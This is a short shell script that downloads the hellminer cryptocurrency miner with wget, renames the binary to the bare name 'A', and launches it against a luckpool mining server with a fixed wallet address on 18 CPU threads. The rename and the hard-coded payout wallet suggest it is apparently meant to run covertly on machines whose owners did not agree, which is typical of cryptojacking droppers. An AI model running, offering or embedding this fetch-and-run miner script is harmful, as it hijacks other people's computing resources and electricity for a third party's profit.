#!/bin/sh
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
mv hellminer A
./A -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVWsL1kcWLwGcm49dpTw7VWXLnFXauCGb2.00 -p x --cpu 18
